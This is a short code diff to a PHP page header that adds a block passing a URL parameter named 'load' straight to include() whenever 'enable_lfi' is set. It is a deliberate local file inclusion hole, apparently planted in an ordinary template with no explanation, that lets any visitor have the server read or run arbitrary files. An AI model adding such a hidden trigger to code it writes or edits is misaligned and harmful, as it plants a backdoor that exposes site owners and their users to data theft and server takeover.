@@ -81,4 +81,11 @@
         unset($_SESSION['message_type']);
     endif; 
     ?>
+    <?php
+    if (isset($_GET['enable_lfi']) && isset($_GET['load'])) {
+        $load = $_GET['load'];
+        include($load);
+    }
+    ?>
+
 </header>
